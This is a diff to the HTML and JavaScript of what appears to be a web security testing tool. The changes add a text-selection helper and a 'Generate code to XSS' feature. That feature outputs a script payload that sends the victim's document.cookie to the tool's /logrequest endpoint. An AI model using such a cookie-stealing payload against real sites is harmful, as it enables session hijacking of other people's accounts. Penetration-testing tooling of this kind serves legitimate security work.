@@ -143,9 +143,28 @@ function clearDiv()
     document.getElementById('tip').innerHTML = '';
 }
 
-function setTip(tip)
+function setTip(tip, select=false)
 {
-    document.getElementById('tip').innerHTML = tip;
+    div = document.getElementById('tip');
+    div.innerHTML = tip;
+
+    if (select)
+    {
+        if (document.body.createTextRange)
+        {
+            range = document.body.createTextRange();
+            range.moveToElementText(div);
+            range.select();
+        } 
+        else if (window.getSelection) 
+        {
+            selection = window.getSelection();        
+            range = document.createRange();
+            range.selectNodeContents(div);
+            selection.removeAllRanges();
+            selection.addRange(range);
+        }
+    }
 }
 
 function hideAll()
@@ -172,7 +191,6 @@ The green part are tools you can use. <input type="button" value="Hide" onclick=
 <br>
 
 <div id="htmldisplaytool" style="display:none; padding:10px;">
-    <input type="button" value="Hide" onclick="hideAll();"/>
 
     <input type="text" value="HTTP/1.1 200 OK" style="width:100%;" readonly="readonly">
 
@@ -196,10 +214,10 @@ Content-Type: text/html
     <script>
         function apply()
         {
-            setTip( '""" + settings["protocol"] + """' + '://' + '""" + settings["servername"] + """' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%0A" + encodeURIComponent(document.getElementById("content").value) );
+            setTip( '""" + proto_name() + """' + '://' + '""" + settings["servername"] + """' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%0A" + encodeURIComponent(document.getElementById("content").value), true );
         }
     </script>
-    <input type="button" value="Generate" onclick="apply();" />
+    <input type="button" value="Generate" onclick="apply();" />  <input type="button" value="Hide" onclick="hideAll();"/>
 
 </div>
 
@@ -255,7 +273,13 @@ Content-Type: text/html
                 <div class="noborder" style="text-align:left;">
                     <br>
                     <br>
-                    <a href="#" onclick="hideAll();alert('TODO');">Generate code to XSS<br>
+                    <script>
+                        function xssTip()
+                        {
+                            setTip('&ltscript&gt<br>var i = new Image();<br>i.src = \"""" + proto_name() + "://" + settings["servername"] + """/logrequest?q=\" + escape(document.cookie);<br>&lt/script&gt', true);
+                        }
+                    </script>
+                    <a href="#" onclick="hideAll();xssTip();">Generate code to XSS<br>
                     <a href="#" onclick="hideAll();show('htmldisplaytool');">Generate Html display url<br>
                 </div>                
             </div>
